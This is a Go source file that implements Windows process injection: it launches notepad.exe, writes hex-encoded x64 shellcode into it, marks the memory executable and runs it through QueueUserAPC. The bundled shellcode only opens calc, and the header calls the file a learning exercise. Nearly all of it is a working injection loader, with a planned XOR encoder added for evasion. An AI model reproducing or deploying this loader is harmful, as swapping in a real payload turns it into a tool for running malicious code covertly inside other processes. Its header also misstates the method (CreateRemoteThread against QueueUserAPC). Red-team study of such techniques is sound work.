/*
	8/25/2020

	QueueUserAPC shellcode injection technique

	currently pops shellcode for calc


	METHOD:

			1. OpenProcess to get handle to PID with CREATE_THREAD_ACCESS (see below)
			2. VirtualAllocEx to create/reserve a read-write page in memory
			3. WriteProcessMemory copies shellcode to address of rw page
			4. VirtualProtectEx adjusts page to allow execution
			5. CreateRemoteThread kicks off execution


	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

	sources:

		https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateRemoteThread/main.go
		https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb

	hoping to use this as a jumping off poiint to learn process injection techniques in golang
*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20

	CREATE_NO_WINDOW = 0x08000000

	THREAD_SET_CONTEXT = 0x0010
)

func main() {

	//ARGS

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Parse()

	//Pop Calc Shellcode - SOLID SHELLCODE POC
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	var psec windows.SecurityAttributes
	var tsec windows.SecurityAttributes

	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\WINDOWS\\system32\\notepad.exe"), nil, &psec, &tsec, false, 0, nil, nil, &si, &pi)

	if errCreateProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
	}

	//Allocating memory in process - VirtualAllocEx
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pi.ProcessId))
	}

	//Writing shellcode into allocated memory - WriteProcessMemory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pi.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pi.ProcessId))

	}

	th_addr, errOpenThread := windows.OpenThread(THREAD_SET_CONTEXT, false, pi.ThreadId)
	if errOpenThread != nil && errOpenThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling OpenThread:\r\n%s", errOpenThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Opened handle in thread ID: %d", pi.ThreadId))
	}

	//Modifying permissions from RW to RX - VirtualProtectEx (RWX is bad and not opsec safe)
	rw := PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pi.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&rw)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
	}

	_, _, errQueueUserAPC := QueueUserAPC.Call(addr, (uintptr)(th_addr), 0)

	if errQueueUserAPC != nil && errQueueUserAPC.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling QueueUserAPC:\r\n%s", errQueueUserAPC.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully executed QueueUserAPC"))
	}
}
